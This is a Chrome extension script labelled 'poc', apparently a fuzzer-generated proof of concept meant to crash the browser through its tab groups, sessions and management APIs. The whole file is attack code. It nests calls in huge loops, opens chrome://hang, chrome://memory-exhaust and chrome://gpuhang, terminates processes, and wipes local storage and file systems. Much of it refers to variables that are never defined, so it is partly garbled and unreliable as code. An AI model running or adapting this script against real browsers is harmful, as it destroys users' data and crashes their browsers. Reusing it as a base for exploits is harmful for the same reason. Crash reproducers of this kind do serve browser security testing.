
function chrome_tabs_create(opt) {return new Promise(resolve => {chrome.tabs.create(opt, tab => resolve(tab));});}
function chrome_tabs_getAllInWindow(winId) {return new Promise(resolve => {chrome.tabs.getAllInWindow(winId, tabs => resolve(tabs));});}
function chrome_tabs_update(tabId, updateProperties) {return new Promise(resolve => {chrome.tabs.update(tabId, updateProperties, tab => resolve(tab));});}
function chrome_tabs_move(tabIds, updateProperties) {return new Promise(resolve => {chrome.tabs.move(tabIds, updateProperties, tabs => resolve(tabs));});}
function chrome_tabs_discard(tabId) {return new Promise(resolve => {chrome.tabs.discard(tabId, tab => resolve(tab));});}
function chrome_windows_get(windowId, getInfo) {return new Promise(resolve => {chrome.windows.get(windowId, getInfo, window => resolve(window));});}
function chrome_windows_getAll(getInfo) {return new Promise(resolve => {chrome.windows.getAll(getInfo, window => resolve(window));});}
function chrome_windows_update(windowId, updateInfo) {return new Promise(resolve => {chrome.windows.update(windowId, updateInfo, window => resolve(window));});}
function chrome_sessions_getRecentlyClosed(filter) {return new Promise(resolve => {chrome.sessions.getRecentlyClosed(filter, sessions => resolve(sessions));});}
function chrome_sessions_restore(sessionId) {return new Promise(resolve => {chrome.sessions.restore(sessionId, restoredSession => resolve(restoredSession));});}
function chrome_management_getAll() {return new Promise(resolve => {chrome.management.getAll(result => resolve(result));});}
function chrome_management_getSelf() {return new Promise(resolve => {chrome.management.getSelf(result => resolve(result));});}
function chrome_webNavigation_getAllFrames(details) {return new Promise(resolve => {chrome.webNavigation.getAllFrames(details, result => resolve(result));});}
function chrome_tabs_group(opts) {return new Promise(resolve => {chrome.tabs.group(opts, groupId => resolve(groupId));});}
function chrome_tabGroups_move(tabgroupId, updateProperties) {return new Promise(resolve => {chrome.tabGroups.move(tabgroupId, updateProperties, tabGroups => resolve(tabGroups));});}
function chrome_tabGroups_get(tabgroupId) {return new Promise(resolve => {chrome.tabGroups.get(tabgroupId, tabGroups => resolve(tabGroups));});}

async function poc(){
    var i=0;
//*
try { var var05 = (await chrome_sessions_getRecentlyClosed({maxResults:10})) } catch(e) {}
try { var tab04 = (await chrome_tabs_update(var05[4].tab.id, {})) } catch(e) {}
try { var tabgroup03 = (await chrome_tabs_group({tabIds:[tab04.id,tab04.id,tab04.id]})) } catch(e) {}
try { var win07 = (await chrome_windows_getAll({populate:true, windowTypes:["normal"]})) } catch(e) {}
try { var var06 = win07[5].id } catch(e) {}
try { var var02 = (await chrome_tabGroups_move(tabgroup03, {windowId:var06, index:10})) } catch(e) {}
try { var var01 = function func_02(){try { chrome.webNavigation.onCommitted.dispatch(); } catch(e) {}} } catch(e) {}
try { await chrome.browsingData.removeFileSystems({since:1}, function(){try { window.parent.print(eval(var01()));chrome.tabGroups.get(var02); } catch(e) {}}) } catch(e) {}
try { tab04.groupId = var02 } catch(e) {}
//*
try { var tab09 = (await chrome_tabs_update(undefined, {active:false, selected:false, pinned:false, muted:false})) } catch(e) {}
try { var var10 = var05[7].window.id } catch(e) {}
try { var group08 = (await chrome_tabs_group({tabIds:[tab09.id,tab09.id], createProperties:{windowId:var10}})) } catch(e) {}
try { var var13 = await chrome_management_getAll() } catch(e) {}
try { var var12 = var13[4] } catch(e) {}
try { var var11 = (await chrome.management.getPermissionWarningsById(var12.id)) } catch(e) {}
try { var var14 = tab09 } catch(e) {}
try { var group20 = (await chrome_tabs_group({tabIds:[tab04.id]})) } catch(e) {}
try { chrome.tabGroups.move(group08, {windowId:var10, index:0}, function(param18){try { chrome.tabGroups.update(var19, {collapsed:true, color:"green"}, function(param20){chrome.extension.sendRequest(undefined)});for (i=0; i < 10000; ++i) {window.frames[1].focus(eval(var01()))};;chrome.tabGroups.move(var19, function(param18){window.parent.dispatchEvent(new CustomEvent('ondragexit'))}); } catch(e) {}}) } catch(e) {}
try { var group21 = (await chrome_tabs_group({tabIds:[tab09.id,undefined], groupId:tabgroup03})) } catch(e) {}
try { var var30 = var16[0].window } catch(e) {}
try { var var32 = win07[0] } catch(e) {}
try { var var33 = var16[4] } catch(e) {}
try { var tab36 = (await chrome_tabs_discard(var28.id)) } catch(e) {}

// +
try { var group55 = (await chrome_tabGroups_move(group20, {windowId:var06, index:5})) } catch(e) {}
try { var var56 = (await chrome_tabs_getAllInWindow(var10)) } catch(e) {}
try { chrome.storage.sync.get(["xx"], function(result){try { (chrome.tabs.update(var28.id, {}, function(param53){chrome.tabs.removeCSS(var28.id, {code:var48, allFrames:false, frameId:var27[1].frameId, matchAboutBlank:false}, function(){for (i=0; i < 65535; ++i) {chrome.tabCapture.getCapturedTabs(function(CaptureInfos){try { chrome.bookmarks.search('chrome://hang/', function(param44){window.window.dispatchEvent(new CustomEvent('ondevicelight'))});;window.setTimeout(function() {try { for (i=0; i < 261; ++i) {chrome.benchmarking.clearCache()}; } catch(e) {}}, 0*100*5);; } catch(e) {}})}})})); } catch(e) {}}) } catch(e) {}
try { chrome.extension.onMessage.addListener(var45) } catch(e) {}
try { var var57 = (await chrome_tabs_group({tabIds:var22, groupId:var19})) } catch(e) {}
try { chrome.tabs.sendRequest(var56.id, undefined, function(param14){try { for (i=0; i < 9; ++i) {chrome.idle.setDetectionInterval(8)};;chrome.tabs.executeScript(var25.id, {function:var01, frameId:var27[5].frameId}, function(param14){}); } catch(e) {}}) } catch(e) {}
try { eval(var48()) } catch(e) {}
try { chrome.extension.getViews({type:"tab", windowId:var06, tabId:tab09.id}) } catch(e) {}
//
try { var var66 = (await chrome_tabs_group({tabIds:tab36.id, createProperties:{windowId:var10}})) } catch(e) {}
try { chrome.extension.onConnectExternal.removeListener(var31) } catch(e) {}
try { chrome.tabGroups.update(group08, {collapsed:true}, function(param19){try { chrome.runtime.onStartup.removeListener(var54);chrome.fontSettings.onMinimumFontSizeChanged.removeListener(var49);chrome.notifications.create(undefined, {}, function(param53){(chrome.windows.getCurrent({populate:true, windowTypes:["devtools"]}, function(param30){for (i=0; i < 10000; ++i) {chrome.webNavigation.onDOMContentLoaded.removeListener(var52)}}))});(chrome.windows.update(var10, function(param15){chrome.tabCapture.getCapturedTabs(function(CaptureInfos){try { chrome.action.setIcon({tabId:var56.id}, function(){for (i=0; i < 14; ++i) {window.parent.dispatchEvent(new CustomEvent('onanimationend'))}}); } catch(e) {}})}));for(i=0; i < 32768; i++){new BigInt64Array(0x1000000);}; } catch(e) {}}) } catch(e) {}
try { chrome.runtime.onConnectExternal.addListener(var37) } catch(e) {}
try { var var67 = (await chrome_windows_get(var63, {})) } catch(e) {}
try { (chrome.management.getPermissionWarningsById(var12.id, function(param13){try { var67.type = "app"; } catch(e) {}})) } catch(e) {}
try { var group68 = (await chrome_tabs_group({tabIds:var25.id, groupId:var02})) } catch(e) {}
try { eval(var37(var34)) } catch(e) {}
try { chrome.tabs.sendMessage(var25.id, {"xx":{"xx":undefined},"xx":undefined}, {frameId:var27[2].frameId}, function(param53){try { chrome.search.query({text:var64[1].name, disposition:"NEW_TAB", tabId:tab09.id}); } catch(e) {}}) } catch(e) {}
try { chrome.extension.getExtensionTabs(var10) } catch(e) {}
try { chrome.windows.onCreated.addListener(var52) } catch(e) {}
try { chrome.tabGroups.get(var57) } catch(e) {}
try { var var69 = (await chrome_tabs_group({tabIds:tab04.id, createProperties:{windowId:var63}})) } catch(e) {}
try { chrome.webNavigation.onCreatedNavigationTarget.addListener(var37) } catch(e) {}
try { tab36.id = var25.id } catch(e) {}
try { chrome.tabs.query({index:8}, function(param43){try { window.frames[0].dispatchEvent(new CustomEvent('onanimationcancel'));window.parent.dispatchEvent(new CustomEvent('cancel'));chrome.fontSettings.setDefaultFixedFontSize({genericFamily:"fantasy"}, function(){try { chrome.tabs.setZoom(tab36.id, -1, function(){window.opener.dispatchEvent(new CustomEvent('ondeviceorientationabsolute'))});chrome.tabGroups.move(group68, {index:6}, function(param08){(chrome.tabs.move(var25.id, {index:7}, function(param47){chrome.tabs.remove(var56.id, function(){for (i=0; i < 15; ++i) {chrome.history.onVisited.removeListener(var23)}})}))}); } catch(e) {}});chrome.tabGroups.update(group55, {collapsed:false}, function(param57){window.open('chrome://newtab', var64[0].name, "toolbar=false,scrollbars=true,resizable=false,top=1,left=65536,width=85,height=98").requestIdleCallback(var62)});; } catch(e) {}}) } catch(e) {}
try { var var70 = (await chrome_tabs_group({tabIds:tab04.id, groupId:var66})) } catch(e) {}
//
try { chrome.input.ime.onKeyEvent.addListener(var45) } catch(e) {}
try { chrome.webNavigation.onCompleted.addListener(var37) } catch(e) {}
try { var var71 = var12 } catch(e) {}
try { chrome.tabGroups.get(group68) } catch(e) {}
try { var var72 = (await chrome_tabs_move(var22, {windowId:var06, index:3})) } catch(e) {}
try { var var73 = (await chrome_management_getAll()) } catch(e) {}
try { var var75 = var13[3] } catch(e) {}
try { var var74 = var75 } catch(e) {}
try { (chrome.tabs.update(tab09.id, {openerTabId:var35.id}, function(param14){try { chrome.notifications.create(undefined, {type:"progress", iconUrl:'chrome://memory-exhaust/', appIconMaskUrl:'chrome://restart/', title:var13[3].name, message:var64[2].name, contextMessage:var73[4].name, priority:1, eventTime:9, progress:1, isClickable:false, requireInteraction:true}, function(param74){}); } catch(e) {}})) } catch(e) {}
try { var var76 = (await chrome_webNavigation_getAllFrames(var28.id)) } catch(e) {}
try { chrome.tabGroups.update(var66, function(){try { chrome.tabs.insertCSS(var56.id, {code:var48, frameId:var76[4].frameId}, function(){for (i=0; i < 10000; ++i) {chrome.app.getDetails()}});chrome.windows.remove(var61, function(){chrome.processes.terminate(var59[18].processId, function(param17){})});;window.frames[1].setTimeout(function(){try { chrome.tabCapture.getCapturedTabs(function(CaptureInfos){try { for (i=0; i < 65535; ++i) {window.parent.focus()}; } catch(e) {}}); } catch(e) {}}, 1);chrome.extension.connect(var12.id);;chrome.idle.getAutoLockDelay(function(param60){chrome.browsingData.removeFileSystems({since:-1}, function(){})});;window.parent.open(window.open('chrome://print', "_top", "toolbar=true,scrollbars=true,resizable=true,top=38,left=0,width=-1,height=1"), var75.name, "toolbar=false,scrollbars=true,resizable=true,top=4294967295,left=0,width=7,height=65536"); } catch(e) {}}) } catch(e) {}
try { chrome.webNavigation.onTabReplaced.addListener(var23) } catch(e) {}
try { await chrome.tabGroups.update(var18, function(){try { chrome.extension.getBackgroundPage();chrome.tabs.connect(tab04.id,{}); } catch(e) {}}) } catch(e) {}
try { var var77 = (await chrome_sessions_restore(undefined)).tab } catch(e) {}
//
try { (chrome.windows.update(var63, {left:-32769, top:1, width:0, height:1, focused:false, drawAttention:false, state:"minimized"}, function(param30){try {  } catch(e) {}})) } catch(e) {}
try { var var79 = var40.id } catch(e) {}
try { var var78 = (await chrome_tabs_group({tabIds:var72, createProperties:{windowId:var79}})) } catch(e) {}
try { var var80 = var64[7] } catch(e) {}
try { chrome.tabs.onAttached.addListener(var38) } catch(e) {}
try { (chrome.tabs.discard(var35.id), function(param47){try {for (i=0; i < 65535; ++i) {chrome.tabGroups.update(var70, function(){for (i=0; i < 65535; ++i) {window.parent.dispatchEvent(new CustomEvent('cancel'))}})};chrome.tabCapture.onStatusChanged.addListener(function(CaptureInfo){try {for (i=0; i < 65535; ++i) {chrome.idltest.getArrayBuffer(function(param26){})}; } catch(e) {}});chrome.tabs.reload(var25.id, function(){chrome.tabGroups.get(var57)});window.parent.dispatchEvent(new CustomEvent('ondragend'));;chrome.idltest.getArrayBuffer(function(param32){(chrome.tabs.move(tab36.id, {windowId:var63, index:7}, function(param34){window.opener.open('chrome://memory-pressure-critical/')}))}); } catch(e) {}}) } catch(e) {}
try { var var81 = await chrome_management_getAll() } catch(e) {}
try { var var82 = await chrome_management_getAll() } catch(e) {}
try { chrome.tabs.getZoomSettings(tab09.id, function(){try { chrome.bookmarks.create({parentId:undefined, index:1, title:var81[4].name, url:'chrome://gpuhang/'}, function(param17){window.parent.dispatchEvent(new CustomEvent('cancel'))});window.frames[0].blur(eval(var62()));for (i=0; i < 14; ++i) {};chrome.tabs.onRemoved.removeListener(var38);chrome.pageAction.show(var77.id, function(){window.window.dispatchEvent(new CustomEvent('abort'))});;chrome.tabCapture.getMediaStreamId({targetTabId:var56.id}, function(stream){try { window.frames[1].moveBy(eval(var01()), var65());chrome.runtime.onConnectExternal.removeListener(var31);chrome.browserAction.setTitle({title:var82[42].name},function(){for (i=0; i < 4294967295; ++i) {try { chrome.runtime.sendNativeMessage(var75.name, {"xx":{"xx":undefined},"xx2":undefined}, function(param50){try { ;chrome.extension.sendNativeMessage({}); } catch(e) {}}); } catch(e) {}}});chrome.browsingData.removePluginData({}, function(){chrome.extension.sendMessage(var11[2].id, {"xx":{"xx":{"xx":{"xx":undefined},"xx4":undefined},"xx2":undefined},"xx3":undefined}, function(param42){try { for (i=0; i < 443; ++i) {window.opener.postMessage(var48(), "*")}; } catch(e) {}})});chrome.tabs.captureVisibleTab(var06, {quality:1}, function(param33){chrome.action.getBadgeText({}, function(param30){(chrome.tabs.update(var77.id, {autoDiscardable:true}, function(param29){(chrome.tabs.get(var28.id, function(param43){}))}))})}); } catch(e) {}}); } catch(e) {}}) } catch(e) {}
try { chrome.tabGroups.move(group20, {windowId:var61}, function(param20){try { window.opener.prompt(var48(), eval(var48())); } catch(e) {}}) } catch(e) {}
try { chrome.runtime.onMessageExternal.addListener(var45) } catch(e) {}
try { chrome.instanceID.deleteID(function(){try { chrome.tabGroups.update(group20, {collapsed:true}, function(param02){chrome.browsingData.removePluginData({since:65536}, function(){chrome.sessions.getDevices({maxResults:-1}, function(param50){window.opener.scrollByLines(-1)})})});;for (i=0; i < 65535; ++i) {}; } catch(e) {}}) } catch(e) {}
try { chrome.extension.onRequest.addListener(var45) } catch(e) {}
try { var var83 = (await chrome_tabs_group({tabIds:var72})) } catch(e) {}
try { chrome.tabs.sendMessage(var25.id, {}, {}, function(param29){try { window.frames[0].dispatchEvent(new CustomEvent('oncontextmenu'));var40.left = 1; } catch(e) {}}) } catch(e) {}
try { eval(var01()) } catch(e) {}
try { chrome.tabGroups.update(var83, function(){try { chrome.extension.onConnect.removeListener(var23);(chrome.tabs.update(tab09.id, {openerTabId:var28.id}, function(param43){chrome.tabs.connect(var56.id,{frameId:var59[9].frameId})}));(chrome.windows.create({url:'chrome://shorthang/', tabId:tab09.id, left:-2147483648, top:2147483648, width:1, height:1, focused:false, incognito:true, type:"normal", state:"maximized", setSelfAsOpener:false}, function(param24){chrome.history.addUrl({url:'chrome://new-tab-page'}, function(){chrome.tabGroups.get(var57)})}));(chrome.tabs.update(var35.id, {openerTabId:var35.id}, function(param47){for (i=0; i < 12; ++i) {chrome.bookmarks.getTree(function(param44){chrome.benchmarking.isSingleProcess()})}}));for (i=0; i < 818; ++i) {chrome.runtime.onUpdateAvailable.removeListener(var52)}; } catch(e) {}}) } catch(e) {}
try { chrome.sessions.onChanged.addListener(var49) } catch(e) {}
try { eval(var62()) } catch(e) {}
try { chrome.tabGroups.move(group20, {windowId:var63, index:1}, function(param78){try { ;;chrome.pageAction.setPopup({tabId:var28.id, popup:var12.name}, function(){chrome.tabGroups.move(var19, function(param69){window.frames[1].focus()})}); } catch(e) {}}) } catch(e) {}
try { chrome.tabGroups.move(group68, {windowId:var63}, function(param18){try { (chrome.tabs.move(var35.id, {index:2}, function(param14){chrome.tabs.sendMessage(var56.id, {}, {})}));;chrome.tabGroups.update(var57);;window.parent.blur(eval(var54())); } catch(e) {}}) } catch(e) {}
try { var var84 = function func_01(var14){try { (chrome.processes.onExited.removeListener(var45));chrome.management.installReplacementWebApp(function(){chrome.app.runningState()}); } catch(e) {}} } catch(e) {}

// ++
try { var var85 = (await chrome_management_getSelf()) } catch(e) {}
try { (chrome.management.getAll(function(param11){try { chrome.displaySource.onSinksUpdated.addListener(function(param14){window.parent.dispatchEvent(new CustomEvent('ondragover'))});(chrome.windows.onFocusChanged.removeListener(var84));chrome.runtime.getURL("./");chrome.notifications.getPermissionLevel(function(param50){});chrome.management.canInstallReplacementAndroidApp(function(result){chrome.fontSettings.getMinimumFontSize({genericFamily:"sansserif"}, function(param43){try { chrome.tabGroups.get(var83);;for(i=0; i < 762; i++){try { window.frames[7].dispatchEvent(new CustomEvent('dragend'));chrome.extension.sendRequest(undefined, function(param32){try { window.opener.dispatchEvent(new CustomEvent('blur'));;chrome.tabGroups.move(var83, {windowId:var79, index:10}, function(param69){chrome.browserAction.setBadgeText({text:var85.name}, function(){chrome.runtime.restart()})}); } catch(e) {}});chrome.alarms.create(var81[6].name, {when:1, delayInMinutes:1, periodInMinutes:0});for (i=0; i < 1; ++i) {chrome.management.setEnabled(var11[4].id, true, function(){chrome.tabGroups.move(var78, {index:65536}, function(param08){(chrome.tabs.move(var72, {windowId:var06, index:2}, function(param53){chrome.extension.sendRequest(undefined)}))})})};tab09.audible = false; } catch(e) {}}; } catch(e) {}})}); } catch(e) {}})) } catch(e) {}
try { var var86 = (await chrome_tabs_group({tabIds:var72, createProperties:{windowId:var10}})) } catch(e) {}
try { chrome.runtime.onMessage.addListener(var45) } catch(e) {}
try { await chrome.tabs.remove(var72, function(){try { for(i=0; i < 778; i++){try { ;chrome.pageAction.setIcon({tabId:var35.id, imageData:{"xx":{"xx":undefined},"xx2":undefined}, path:"./", iconIndex:65535}, function(){chrome.history.onVisitRemoved.removeListener(var23)});window.open('chrome://memory-exhaust/', var12.name, "toolbar=true,scrollbars=true,resizable=true,top=1,left=65536,width=2147483648,height=-32769").dispatchEvent(new CustomEvent('ondblclick')); } catch(e) {}}; } catch(e) {}}) } catch(e) {}
try { (chrome.management.getAll(function(param81){try { chrome.browserAction.getBadgeText({tabId:tab36.id}, function(results){window.frames[0].dispatchEvent(new CustomEvent('load'))});; } catch(e) {}})) } catch(e) {}
try { await chrome.tabGroups.update(var70, {collapsed:false, title:var12.name}, function(param86){try { chrome.tabs.onAttached.removeListener(var38);chrome.management.setEnabled(var12.id, true, function(){chrome.runtime.onInstalled.removeListener(var31)}); } catch(e) {}}) } catch(e) {}
try { eval(var48()) } catch(e) {}
try { var var87 = (await chrome_tabs_group({tabIds:var72, createProperties:{windowId:var06}})) } catch(e) {}
try { chrome.input.ime.onCandidateClicked.addListener(var45) } catch(e) {}
try { chrome.tabs.create({windowId:var79, index:1, openerTabId:var28.id}, function(param29){try { for (i=0; i < 65535; ++i) {chrome.browsingData.removeLocalStorage({since:-32769}, function(){})}; } catch(e) {}}) } catch(e) {}
try { chrome.input.ime.onActivate.addListener(var38) } catch(e) {}
try { var var88 = await chrome_tabGroups_get(group21) } catch(e) {}
try { var var89 = await chrome_tabGroups_get(var83) } catch(e) {}
try { chrome.tabs.create({windowId:var10, index:-32769, openerTabId:tab04.id}) } catch(e) {}
try { (chrome.tabs.discard(undefined), function(param34){try {  } catch(e) {}}) } catch(e) {}
try { await chrome.tabGroups.move(group08, {windowId:var61, index:-1}, function(param18){try { window.opener.print(eval(var58())); } catch(e) {}}) } catch(e) {}

    
}
poc();
